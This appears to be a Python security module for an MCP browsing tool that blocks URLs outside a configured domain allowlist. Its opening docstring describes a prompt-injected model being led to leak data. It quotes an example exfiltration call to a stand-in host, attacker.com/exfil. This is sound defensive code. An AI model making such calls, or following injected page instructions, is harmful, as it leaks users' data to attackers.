"""Security primitives: URL allowlist enforcement.

Why this exists: an MCP tool is just a function the model can call. If Claude
gets confused (or prompt-injected via a page it reads), you do NOT want it to
be able to call navigate("http://attacker.com/exfil?data=...") and leak data.
The allowlist is your blast-radius cap.
"""
from __future__ import annotations

from urllib.parse import urlparse

from .logging_config import get_logger

log = get_logger("security")


class DomainNotAllowedError(Exception):
    """Raised when a tool tries to access a domain outside the allowlist."""


def check_url_allowed(url: str, allowlist: list[str]) -> None:
    """Raise DomainNotAllowedError unless the URL's host ends with an allowlisted suffix.

    Empty allowlist => allow everything (dev/local-test mode), with a loud warning.
    """
    if not allowlist:
        log.warning("allowlist_empty_allow_all", url_domain=_safe_domain(url))
        return

    host = (urlparse(url).hostname or "").lower()
    if not host:
        raise DomainNotAllowedError(f"URL has no host: {url}")

    for allowed in allowlist:
        allowed_l = allowed.lower().lstrip(".")
        if host == allowed_l or host.endswith("." + allowed_l):
            return

    log.warning("domain_blocked", host=host, allowlist=allowlist)
    raise DomainNotAllowedError(
        f"Domain '{host}' is not in the allowlist. "
        f"Add it to config.yaml under url_allowlist if you want to permit it."
    )


def _safe_domain(url: str) -> str:
    try:
        return urlparse(url).netloc or "<empty>"
    except Exception:
        return "<unparseable>"
